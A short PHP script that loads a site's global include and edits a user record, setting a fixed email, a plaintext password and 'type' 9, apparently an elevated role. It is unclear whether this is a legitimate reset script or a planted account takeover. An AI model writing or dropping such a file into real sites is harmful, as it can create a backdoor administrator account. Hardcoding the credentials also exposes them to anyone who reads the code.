<?php
require_once $cfg['root_dir'] . 'includes/global.inc.php';

$usr = new User();
$usr->edit(array(
    "email" => "admin@ysc5.com",
    "password" => "SyedM5111",
    "type" => 9
));